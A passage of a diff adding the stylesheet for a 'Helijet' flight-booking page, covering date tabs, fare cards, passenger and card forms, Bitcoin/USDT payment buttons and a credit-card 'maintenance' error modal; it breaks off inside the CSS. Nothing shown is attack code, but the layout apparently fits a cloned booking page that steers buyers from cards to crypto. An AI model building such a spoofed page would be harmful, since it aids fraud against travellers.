@@ -1,0 +1,2542 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>Book a Flight | Helijet</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&family=Merriweather:wght@400;700&display=swap"/>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=Playfair+Display:ital,wght@0,700;1,700&family=Merriweather:wght@400;700&display=swap');
+
+:root {
+  --primary: #0A2540;
+  --primary-rgb: 10, 37, 64;
+  --primary-light: #2256f2;
+  --primary-dark: #051627;
+  --accent: #E53E3E;
+  --accent-hover: #C53030;
+  --text-main: #334155;
+  --text-muted: #64748B;
+  --bg-page: radial-gradient(circle at 0% 0%, #fbfcfd 0%, #f4f6f9 100%);
+  --bg-card: rgba(255, 255, 255, 0.95);
+  --border-color: rgba(226, 232, 240, 0.8);
+  --shadow-sm: 0 2px 4px rgba(10, 37, 64, 0.03);
+  --shadow-md: 0 8px 30px rgba(10, 37, 64, 0.05);
+  --shadow-lg: 0 20px 50px rgba(10, 37, 64, 0.08);
+  --radius-lg: 16px;
+  --radius-md: 10px;
+  --radius-sm: 6px;
+  --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  --font-sans: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+* {
+  box-sizing: border-box;
+  margin: 0;
+  padding: 0;
+}
+
+body {
+  font-family: var(--font-sans);
+  background: var(--bg-page);
+  color: var(--text-main);
+  min-height: 100vh;
+  line-height: 1.5;
+  -webkit-font-smoothing: antialiased;
+}
+
+/* ── Booking Navigation Header ── */
+#booking-header {
+  background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+  padding: 0 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  height: 70px;
+  box-shadow: var(--shadow-md);
+  position: relative;
+  z-index: 100;
+}
+
+#booking-header .logo {
+  color: #fff;
+  font-family: 'Merriweather', serif;
+  font-size: 24px;
+  font-weight: 700;
+  letter-spacing: 1.5px;
+  text-decoration: none;
+  background: linear-gradient(to right, #ffffff, #cce0ff);
+  -webkit-background-clip: text;
+  -webkit-text-fill-color: transparent;
+}
+
+#booking-header .phone {
+  color: #cce0ff;
+  font-size: 13px;
+  font-weight: 500;
+  letter-spacing: 0.5px;
+}
+
+/* ── SLEEK FLOATING CLOSE BUTTON ── */
+#close-btn {
+  position: fixed;
+  top: 15px;
+  right: 15px;
+  width: 36px;
+  height: 36px;
+  background: rgba(15, 23, 42, 0.85);
+  color: #fff;
+  border: none;
+  border-radius: 50%;
+  font-size: 18px;
+  cursor: pointer;
+  z-index: 999;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  backdrop-filter: blur(4px);
+  transition: var(--transition);
+  box-shadow: var(--shadow-sm);
+}
+
+#close-btn:hover {
+  background: #0f172a;
+  transform: scale(1.05);
+}
+
+/* ── WRAPPERS ── */
+.booking-wrap {
+  width: 100%;
+  max-width: 900px;
+  margin: 16px auto 60px;
+  padding: 0 12px;
+}
+
+@media (min-width: 768px) {
+  .booking-wrap {
+    padding: 0 24px;
+    margin-top: 32px;
+  }
+}
+
+.step-block {
+  background: var(--bg-card);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-lg);
+  margin-bottom: 24px;
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+  transition: var(--transition);
+  backdrop-filter: blur(8px);
+}
+
+.step-block:hover {
+  box-shadow: var(--shadow-lg);
+}
+
+.step-header {
+  background: #f8fafc;
+  border-bottom: 3px solid var(--primary-light);
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+
+.step-num {
+  background: linear-gradient(135deg, var(--accent) 0%, #b81d18 100%);
+  color: #fff;
+  font-weight: 800;
+  font-size: 13px;
+  width: 28px;
+  height: 28px;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  flex-shrink: 0;
+  box-shadow: 0 4px 10px rgba(229, 62, 62, 0.3);
+}
+
+.step-title {
+  color: var(--primary-dark);
+  font-size: 15px;
+  font-weight: 700;
+  text-transform: uppercase;
+  letter-spacing: 0.75px;
+}
+
+.step-body {
+  padding: 20px 16px;
+}
+
+@media (min-width: 768px) {
+  .step-body {
+    padding: 24px 28px;
+  }
+}
+
+/* ── STEP 1: ROUTE SEARCH SUMMARY ── */
+.search-summary {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  background: #f8fafc;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  padding: 14px 16px;
+  margin-bottom: 24px;
+}
+
+.summary-item {
+  flex: 1 1 140px;
+}
+
+.summary-item label {
+  display: block;
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+  color: var(--text-muted);
+  letter-spacing: 0.5px;
+  margin-bottom: 3px;
+}
+
+.summary-item span {
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--primary-dark);
+}
+
+/* ── DATE HORIZONTAL SCROLLER ── */
+.date-tabs {
+  display: flex;
+  gap: 8px;
+  border-bottom: 1px solid var(--border-color);
+  margin-bottom: 20px;
+  overflow-x: auto;
+  -webkit-overflow-scrolling: touch;
+  scrollbar-width: none;
+  padding-bottom: 10px;
+}
+
+.date-tabs::-webkit-scrollbar {
+  display: none;
+}
+
+.date-tab {
+  flex: 0 0 auto;
+  padding: 10px 16px;
+  font-size: 13px;
+  font-weight: 600;
+  cursor: pointer;
+  border: 1px solid #cbd5e1;
+  background: #fff;
+  color: var(--text-main);
+  border-radius: var(--radius-md);
+  transition: var(--transition);
+  text-align: center;
+  min-width: 100px;
+  box-shadow: var(--shadow-sm);
+}
+
+.date-tab:hover {
+  border-color: var(--primary-light);
+  background: #f8fafc;
+}
+
+.date-tab.active {
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: #fff;
+  border-color: var(--primary);
+  box-shadow: 0 4px 15px rgba(10, 37, 64, 0.25);
+}
+
+.date-tab.past {
+  background: #f1f5f9;
+  color: #94a3b8;
+  border-color: #e2e8f0;
+  cursor: not-allowed;
+  pointer-events: none;
+  opacity: 0.6;
+  box-shadow: none;
+}
+
+.date-tab small {
+  display: block;
+  font-size: 10px;
+  color: #f97316;
+  margin-top: 3px;
+  font-weight: 700;
+}
+
+.date-tab.active small {
+  color: #93c5fd;
+}
+
+.date-tab.past small {
+  color: #cbd5e1;
+}
+
+/* ── FLIGHT SCHEDULE CARDS ── */
+#flights-container {
+  margin-bottom: 10px;
+}
+
+.ft-head {
+  display: none !important; /* Hide ugly desktop-only spreadsheet headers */
+}
+
+.ft-no-flights {
+  padding: 30px;
+  text-align: center;
+  color: var(--text-muted);
+  font-size: 14px;
+  font-weight: 600;
+  background: #f8fafc;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+}
+
+/* Boarding pass / ticket inspired design cards */
+.flight-card {
+  background: #fff;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-lg);
+  margin-bottom: 20px;
+  overflow: hidden;
+  box-shadow: var(--shadow-sm);
+  transition: var(--transition);
+}
+
+.flight-card:hover {
+  box-shadow: var(--shadow-md);
+  border-color: #cbd5e1;
+}
+
+.flight-card-header {
+  background: #f8fafc;
+  border-bottom: 1px solid var(--border-color);
+  padding: 16px;
+}
+
+.flight-meta {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  margin-bottom: 12px;
+}
+
+.flight-number-badge {
+  background: rgba(10, 37, 64, 0.08);
+  color: var(--primary);
+  font-size: 11px;
+  font-weight: 700;
+  padding: 4px 10px;
+  border-radius: 20px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.flight-date-badge {
+  font-size: 12px;
+  font-weight: 600;
+  color: var(--text-muted);
+}
+
+.flight-route-flow {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
+}
+
+.route-point {
+  flex: 1;
+}
+
+.route-point.arr {
+  text-align: right;
+}
+
+.route-time {
+  display: block;
+  font-size: 20px;
+  font-weight: 800;
+  color: var(--primary-dark);
+  line-height: 1.1;
+}
+
+.route-airport {
+  display: block;
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-muted);
+  margin-top: 4px;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+
+.route-connector {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 32px;
+}
+
+.connector-arrow {
+  width: 20px;
+  height: 20px;
+  color: var(--primary-light);
+}
+
+.flight-card-body {
+  padding: 12px 16px 16px;
+}
+
+.tier-options-list {
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+}
+
+/* Beautiful selectable fare tiles */
+.ft-tier-row.tier-option-tile {
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  padding: 12px 14px;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  background: #fff;
+  cursor: pointer;
+  transition: var(--transition);
+}
+
+.ft-tier-row.tier-option-tile:hover:not(.disabled) {
+  border-color: var(--primary-light);
+  background: #f8faff;
+}
+
+.ft-tier-row.tier-option-tile.disabled {
+  opacity: 0.55;
+  background: #f8fafc;
+  cursor: not-allowed;
+}
+
+.ft-tier-row.tier-option-tile.row-selected {
+  border-color: var(--primary-light);
+  background: #eff6ff;
+  box-shadow: 0 0 0 2px var(--primary-light);
+}
+
+.ft-tier-cell {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  flex: 1;
+}
+
+.ft-tier-cell input[type=radio] {
+  accent-color: var(--primary-light);
+  width: 17px;
+  height: 17px;
+  cursor: pointer;
+}
+
+.ft-tier-cell label {
+  display: flex;
+  flex-direction: column;
+  font-size: 13px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  cursor: pointer;
+  user-select: none;
+}
+
+.tier-name {
+  font-size: 11px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  color: var(--text-muted);
+}
+
+.ft-tier-row.row-selected .tier-name {
+  color: var(--primary-light);
+}
+
+.avail {
+  font-size: 11px;
+  font-weight: 700;
+  margin-top: 1px;
+}
+
+.avail.few { color: #f97316; }
+.avail.ok { color: #16a34a; }
+.avail.sold { color: #94a3b8; }
+.avail.waitlist { color: #64748b; }
+
+.ft-price {
+  font-size: 14px;
+  font-weight: 800;
+  color: var(--primary-light);
+}
+
+.ft-price.sold {
+  font-size: 11px;
+  font-weight: 600;
+  color: #94a3b8;
+  font-style: italic;
+}
+
+/* ── PROGRESSIVE ENHANCEMENT FOR DESKTOP TILES ── */
+@media (min-width: 768px) {
+  .flight-card {
+    display: grid;
+    grid-template-columns: 320px 1fr;
+    align-items: stretch;
+  }
+  
+  .flight-card-header {
+    border-bottom: none;
+    border-right: 1px solid var(--border-color);
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+  }
+  
+  .flight-card-body {
+    padding: 20px 24px;
+    display: flex;
+    align-items: center;
+  }
+  
+  .tier-options-list {
+    width: 100%;
+    gap: 10px;
+  }
+  
+  .ft-tier-row.tier-option-tile {
+    padding: 14px 18px;
+  }
+}
+
+/* ── STEP ACTION ROWS ── */
+.action-row {
+  display: flex;
+  gap: 10px;
+  flex-wrap: wrap;
+  padding: 20px 0 4px;
+}
+
+.btn-outline, .btn-ghost, .btn-nav, .btn-sort {
+  padding: 10px 20px;
+  font-size: 13px;
+  font-weight: 700;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  transition: var(--transition);
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  border: none;
+  outline: none;
+}
+
+.btn-outline {
+  background: linear-gradient(135deg, var(--accent) 0%, #b81d18 100%);
+  color: #fff;
+  box-shadow: 0 4px 10px rgba(229, 62, 62, 0.2);
+}
+
+.btn-outline:hover {
+  background: linear-gradient(135deg, #b81d18 0%, #901612 100%);
+  transform: translateY(-1px);
+  box-shadow: 0 6px 15px rgba(229, 62, 62, 0.3);
+}
+
+.btn-ghost {
+  background: #64748b;
+  color: #fff;
+  box-shadow: 0 4px 10px rgba(100, 116, 139, 0.2);
+}
+
+.btn-ghost:hover {
+  background: #475569;
+  transform: translateY(-1px);
+}
+
+.btn-nav {
+  border: 1px solid #cbd5e1;
+  background: #fff;
+  color: var(--text-main);
+  box-shadow: var(--shadow-sm);
+}
+
+.btn-nav:hover {
+  border-color: var(--primary-light);
+  color: var(--primary-light);
+  background: #f8faff;
+}
+
+.btn-sort {
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: #fff;
+  margin-left: auto;
+  box-shadow: 0 4px 10px rgba(10, 37, 64, 0.25);
+}
+
+.btn-sort:hover {
+  background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary-dark) 100%);
+  transform: translateY(-1px);
+}
+
+@media (max-width: 600px) {
+  .action-row {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    width: 100%;
+  }
+  .btn-sort {
+    margin-left: 0;
+    grid-column: span 2;
+  }
+}
+
+/* ── STEP 2: PASSENGERS ── */
+.login-bar {
+  background: #f8fafc;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  padding: 16px 20px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 20px;
+  flex-wrap: wrap;
+  gap: 12px;
+  box-shadow: var(--shadow-sm);
+}
+
+.login-bar span {
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--primary-dark);
+}
+
+.login-now-btn {
+  background: var(--accent);
+  color: #fff;
+  border: none;
+  padding: 10px 20px;
+  font-size: 13px;
+  font-weight: 700;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  transition: var(--transition);
+  box-shadow: 0 4px 10px rgba(229, 62, 62, 0.2);
+}
+
+.login-now-btn:hover {
+  background: var(--accent-hover);
+  transform: translateY(-1px);
+}
+
+.create-link {
+  color: var(--primary-light);
+  font-size: 13px;
+  text-decoration: none;
+  font-weight: 700;
+  transition: var(--transition);
+}
+
+.create-link:hover {
+  color: var(--primary-dark);
+  text-decoration: underline;
+}
+
+.pax-hint {
+  font-size: 13px;
+  font-weight: 500;
+  color: var(--text-muted);
+  margin-bottom: 16px;
+}
+
+.pax-num {
+  display: inline-block;
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: #fff;
+  width: 24px;
+  height: 24px;
+  border-radius: 50%;
+  text-align: center;
+  line-height: 24px;
+  font-size: 12px;
+  font-weight: 700;
+  margin-right: 8px;
+  box-shadow: 0 2px 5px rgba(10, 37, 64, 0.25);
+}
+
+.pax-row {
+  margin-bottom: 24px;
+  border-bottom: 1px solid var(--border-color);
+  padding-bottom: 24px;
+}
+
+.pax-row:last-of-type {
+  margin-bottom: 0;
+  border-bottom: none;
+  padding-bottom: 0;
+}
+
+.pax-title {
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+}
+
+/* Responsive passenger input layouts */
+.form-grid, .form-grid2, .form-full {
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: 16px;
+}
+
+@media (min-width: 768px) {
+  .form-grid {
+    grid-template-columns: 1fr 1fr 120px 1fr 1fr;
+    gap: 12px;
+  }
+  .form-grid2 {
+    grid-template-columns: 1fr 1fr 1fr;
+    gap: 12px;
+  }
+  .form-full {
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+}
+
+.form-item {
+  display: flex;
+  flex-direction: column;
+}
+
+.form-item label {
+  font-size: 12px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  margin-bottom: 6px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.form-item input, .form-item select {
+  width: 100%;
+  padding: 12px 14px;
+  border: 1px solid #cbd5e1;
+  border-radius: var(--radius-md);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--primary-dark);
+  background: #fff;
+  transition: var(--transition);
+  box-shadow: inset 0 1px 2px rgba(0,0,0,0.02);
+}
+
+.form-item input:focus, .form-item select:focus {
+  outline: none;
+  border-color: var(--primary-light);
+  box-shadow: 0 0 0 3px rgba(34, 86, 242, 0.15), inset 0 1px 2px rgba(0,0,0,0.02);
+}
+
+.form-item input.req {
+  border-left: 4px solid var(--accent);
+}
+
+.form-item input.req:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 3px rgba(229, 62, 62, 0.15);
+}
+
+/* ── STEP 3: TRIP SUMMARY ── */
+.summary-wrap {
+  display: flex;
+  flex-direction: column;
+  gap: 20px;
+}
+
+.summary-right {
+  width: 100%;
+  max-width: 440px;
+  margin: 0 auto;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-lg);
+  overflow: hidden;
+  box-shadow: var(--shadow-md);
+  background: #fff;
+}
+
+@media (min-width: 768px) {
+  .summary-right {
+    margin-left: auto;
+    margin-right: 0;
+  }
+}
+
+.sum-row {
+  display: flex;
+  justify-content: space-between;
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border-color);
+  font-size: 14px;
+  font-weight: 600;
+  color: var(--text-main);
+}
+
+.sum-row.total {
+  background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+  color: #fff;
+  font-weight: 700;
+  font-size: 16px;
+  border-bottom: none;
+}
+
+.sum-label {
+  color: var(--text-muted);
+}
+
+.sum-row.total .sum-label {
+  color: rgba(255,255,255,0.85);
+}
+
+.coupon-row {
+  display: flex;
+  padding: 12px 20px;
+  border-bottom: 1px solid var(--border-color);
+  background: #f8fafc;
+}
+
+.coupon-row input {
+  flex: 1;
+  padding: 10px 14px;
+  border: 1px solid #cbd5e1;
+  border-radius: var(--radius-sm) 0 0 var(--radius-sm);
+  font-size: 13px;
+  font-family: var(--font-sans);
+}
+
+.coupon-row button {
+  padding: 10px 16px;
+  border: none;
+  background: var(--primary-light);
+  color: #fff;
+  border-radius: 0 var(--radius-sm) var(--radius-sm) 0;
+  cursor: pointer;
+  transition: var(--transition);
+  font-weight: 700;
+}
+
+.coupon-row button:hover {
+  background: var(--primary-dark);
+}
+
+.ref-row {
+  padding: 14px 20px;
+  border-bottom: 1px solid var(--border-color);
+}
+
+.ref-row select {
+  width: 100%;
+  padding: 10px;
+  border: 1px solid #cbd5e1;
+  border-radius: var(--radius-md);
+  font-size: 13px;
+  font-family: var(--font-sans);
+}
+
+.agent-row {
+  padding: 14px 20px;
+  font-size: 13px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  color: var(--text-main);
+}
+
+.agent-row input[type=checkbox] {
+  accent-color: var(--primary-light);
+  width: 16px;
+  height: 16px;
+  cursor: pointer;
+}
+
+/* ── STEP 4: PAYMENT OPTIONS ── */
+.payment-wrap {
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: 24px;
+  align-items: start;
+}
+
+@media (min-width: 768px) {
+  .payment-wrap {
+    grid-template-columns: 260px 1fr;
+  }
+}
+
+.payment-options {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+
+/* Touch-optimized tactile payment tiles */
+.payment-options label {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 14px 16px;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  background: #fff;
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  cursor: pointer;
+  transition: var(--transition);
+  box-shadow: var(--shadow-sm);
+  user-select: none;
+}
+
+.payment-options label:hover {
+  border-color: var(--primary-light);
+  background: #f8fafc;
+}
+
+.payment-options label:has(input[type=radio]:checked) {
+  border-color: var(--primary-light);
+  background: #eff6ff;
+  box-shadow: 0 0 0 2px var(--primary-light);
+}
+
+.payment-options input[type=radio] {
+  accent-color: var(--primary-light);
+  width: 17px;
+  height: 17px;
+  cursor: pointer;
+}
+
+/* Cryptocurrency suboptions */
+#crypto-subopts {
+  display: none;
+  margin-top: 8px;
+  padding: 16px;
+  background: #f8fafc;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  animation: slideDown 0.25s ease-out;
+}
+
+@keyframes slideDown {
+  from { opacity: 0; transform: translateY(-8px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+#crypto-subopts p {
+  font-size: 11px;
+  font-weight: 800;
+  color: var(--primary-light);
+  margin-bottom: 12px;
+  text-transform: uppercase;
+  letter-spacing: 0.75px;
+}
+
+.crypto-coin-btn {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  padding: 12px 16px;
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-md);
+  background: #fff;
+  cursor: pointer;
+  font-size: 14px;
+  font-weight: 700;
+  color: var(--text-main);
+  margin-bottom: 8px;
+  width: 100%;
+  text-align: left;
+  transition: var(--transition);
+  box-shadow: var(--shadow-sm);
+}
+
+.crypto-coin-btn:hover {
+  border-color: #f7931a;
+  background: #fffdfa;
+  transform: translateY(-1px);
+}
+
+.crypto-coin-btn.usdt:hover {
+  border-color: #26a17b;
+  background: #f7fdfa;
+  transform: translateY(-1px);
+}
+
+.crypto-coin-btn .coin-icon {
+  width: 32px;
+  height: 32px;
+  border-radius: 50%;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 16px;
+  color: #fff;
+  flex-shrink: 0;
+  font-weight: 700;
+  box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+}
+
+.coin-btc { background: #f7931a; }
+.coin-usdt { background: #26a17b; }
+
+.coin-label {
+  display: flex;
+  flex-direction: column;
+  line-height: 1.2;
+}
+
+.coin-label small {
+  font-size: 10px;
+  font-weight: 500;
+  color: var(--text-muted);
+}
+
+.usdt-note {
+  display: none;
+  margin-top: 8px;
+  padding: 12px 16px;
+  background: #fef2f2;
+  border: 1px solid #fca5a5;
+  border-radius: var(--radius-md);
+  font-size: 12px;
+  font-weight: 600;
+  color: #991b1b;
+  line-height: 1.4;
+}
+
+/* Card details form container */
+.card-form {
+  background: #f8fafc;
+  padding: 20px;
+  border-radius: var(--radius-lg);
+  border: 1px solid var(--border-color);
+}
+
+.card-form label {
+  display: block;
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  margin-bottom: 6px;
+  margin-top: 14px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.card-form label:first-of-type {
+  margin-top: 0;
+}
+
+.card-form input, .card-form select {
+  width: 100%;
+  padding: 12px 14px;
+  border: 1px solid #cbd5e1;
+  border-radius: var(--radius-md);
+  font-family: var(--font-sans);
+  font-size: 14px;
+  font-weight: 500;
+  color: var(--primary-dark);
+  background: #fff;
+  transition: var(--transition);
+}
+
+.card-form input:focus, .card-form select:focus {
+  outline: none;
+  border-color: var(--primary-light);
+  box-shadow: 0 0 0 3px rgba(34, 86, 242, 0.15);
+}
+
+.exp-row {
+  display: flex;
+  gap: 12px;
+}
+
+.exp-row select {
+  flex: 1;
+}
+
+.tc-link {
+  color: var(--primary-light);
+  font-size: 13px;
+  text-decoration: none;
+  font-weight: 700;
+  display: inline-block;
+  margin-top: 16px;
+  transition: var(--transition);
+}
+
+.tc-link:hover {
+  color: var(--primary-dark);
+  text-decoration: underline;
+}
+
+.card-logos {
+  display: flex;
+  gap: 10px;
+  margin-top: 16px;
+  align-items: center;
+}
+
+.card-logos img {
+  height: 28px;
+  filter: drop-shadow(0 1px 2px rgba(0,0,0,0.05));
+}
+
+.ssl-note {
+  font-size: 11px;
+  font-weight: 500;
+  color: var(--text-muted);
+  margin-top: 14px;
+  line-height: 1.4;
+}
+
+/* ── STEP 5: CONFIRMATION ── */
+.conf-grid {
+  display: grid;
+  grid-template-columns: 1fr;
+  gap: 20px;
+}
+
+@media (min-width: 768px) {
+  .conf-grid {
+    grid-template-columns: 1fr 1fr;
+    gap: 24px;
+  }
+}
+
+.safe-sender-note {
+  background: #fffbeb;
+  border: 1px solid #fef3c7;
+  border-radius: var(--radius-md);
+  padding: 16px;
+  font-size: 13px;
+  font-weight: 500;
+  color: #92400e;
+  display: flex;
+  gap: 12px;
+  align-items: flex-start;
+  line-height: 1.5;
+}
+
+.safe-sender-note .icon {
+  font-size: 18px;
+  color: #d97706;
+  flex-shrink: 0;
+}
+
+.safe-sender-note a {
+  color: var(--primary-light);
+  font-weight: 700;
+  text-decoration: none;
+}
+
+.safe-sender-note a:hover {
+  text-decoration: underline;
+}
+
+/* ── SUBMIT SECTION ── */
+.submit-bar {
+  background: var(--bg-card);
+  border: 1px solid var(--border-color);
+  border-radius: var(--radius-lg);
+  padding: 18px 24px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  gap: 16px;
+  box-shadow: var(--shadow-md);
+}
+
+.submit-btn {
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: #fff;
+  border: none;
+  padding: 14px 36px;
+  font-size: 14px;
+  font-weight: 700;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  transition: var(--transition);
+  box-shadow: 0 4px 12px rgba(10, 37, 64, 0.25);
+}
+
+.submit-btn:hover {
+  background: linear-gradient(135deg, var(--primary-light) 0%, var(--primary-dark) 100%);
+  transform: translateY(-1px);
+}
+
+.cancel-link {
+  color: var(--text-muted);
+  font-size: 14px;
+  font-weight: 600;
+  text-decoration: none;
+  transition: var(--transition);
+}
+
+.cancel-link:hover {
+  color: var(--primary-dark);
+}
+
+/* ── CLASSIC GLASSMORPHIC MODALS ── */
+#np-overlay, #res-overlay, #cc-maintenance-overlay {
+  display: none;
+  position: fixed;
+  inset: 0;
+  background: rgba(5, 15, 30, 0.6);
+  z-index: 9500;
+  align-items: center;
+  justify-content: center;
+  backdrop-filter: blur(12px);
+  -webkit-backdrop-filter: blur(12px);
+  padding: 16px;
+}
+
+#np-overlay.open, #res-overlay.open, #cc-maintenance-overlay.open {
+  display: flex;
+}
+
+#np-modal, #res-modal, #cc-maintenance-modal {
+  position: relative;
+  background: rgba(255, 255, 255, 0.98);
+  border: 1px solid rgba(255, 255, 255, 0.8);
+  border-radius: 20px;
+  overflow: hidden;
+  box-shadow: var(--shadow-lg), 0 30px 60px -15px rgba(10, 37, 64, 0.35);
+  animation: modalScaleUp 0.35s cubic-bezier(0.34, 1.56, 0.64, 1);
+  max-width: 440px;
+  width: 100%;
+}
+
+@keyframes modalScaleUp {
+  from { opacity: 0; transform: scale(0.92) translateY(12px); }
+  to { opacity: 1; transform: scale(1) translateY(0); }
+}
+
+#np-close {
+  position: absolute;
+  top: 12px;
+  right: 12px;
+  width: 32px;
+  height: 32px;
+  border: none;
+  background: rgba(15, 23, 42, 0.08);
+  color: var(--primary-dark);
+  font-size: 16px;
+  border-radius: 50%;
+  cursor: pointer;
+  z-index: 10;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  transition: var(--transition);
+}
+
+#np-close:hover {
+  background: rgba(15, 23, 42, 0.15);
+  transform: rotate(90deg);
+}
+
+/* Modals content styling */
+#res-modal, #cc-maintenance-modal {
+  padding: 40px 32px 32px;
+  text-align: center;
+}
+
+.res-spinner, .cc-spinner {
+  width: 68px;
+  height: 68px;
+  border: 5px solid #e2e8f0;
+  border-top-color: var(--primary-light);
+  border-radius: 50%;
+  animation: spin 0.85s linear infinite;
+  margin: 0 auto;
+}
+
+.cc-spinner {
+  border-top-color: var(--accent);
+}
+
+@keyframes spin {
+  to { transform: rotate(360deg); }
+}
+
+.res-spinner-text, .cc-spinner-text {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--primary-dark);
+  margin-top: 24px;
+}
+
+.res-spinner-sub, .cc-spinner-sub {
+  font-size: 13px;
+  color: var(--text-muted);
+  margin-top: 8px;
+}
+
+.res-icon-wrap, .cc-error-icon-wrap {
+  width: 72px;
+  height: 72px;
+  border-radius: 50%;
+  background: linear-gradient(135deg, #16a34a 0%, #22c55e 100%);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 24px;
+  box-shadow: 0 10px 20px rgba(22, 163, 74, 0.25);
+}
+
+.cc-error-icon-wrap {
+  background: linear-gradient(135deg, var(--accent) 0%, #ef4444 100%);
+  box-shadow: 0 10px 20px rgba(229, 62, 62, 0.25);
+}
+
+.res-icon-wrap svg, .cc-error-icon-wrap svg {
+  width: 36px;
+  height: 36px;
+  color: #fff;
+}
+
+.res-id-label {
+  font-size: 11px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  color: var(--text-muted);
+  margin-bottom: 8px;
+}
+
+.res-id {
+  font-family: var(--font-sans);
+  font-size: 20px;
+  font-weight: 800;
+  color: var(--primary-dark);
+  letter-spacing: 1px;
+  background: #f1f5f9;
+  border: 1px solid var(--border-color);
+  border-radius: 8px;
+  padding: 10px 20px;
+  display: inline-block;
+  margin-bottom: 24px;
+  box-shadow: var(--shadow-sm);
+}
+
+.res-headline, .cc-error-title {
+  font-size: 18px;
+  font-weight: 800;
+  color: var(--primary-dark);
+  margin-bottom: 12px;
+}
+
+.cc-error-title {
+  color: var(--accent);
+}
+
+.res-sub, .cc-error-msg {
+  font-size: 13px;
+  color: var(--text-main);
+  line-height: 1.6;
+  margin-bottom: 28px;
+}
+
+.res-close-btn, .cc-close-btn {
+  background: linear-gradient(135deg, var(--primary) 0%, var(--primary-light) 100%);
+  color: #fff;
+  border: none;
+  padding: 14px 28px;
+  font-size: 14px;
+  font-weight: 700;
+  border-radius: var(--radius-md);
+  cursor: pointer;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
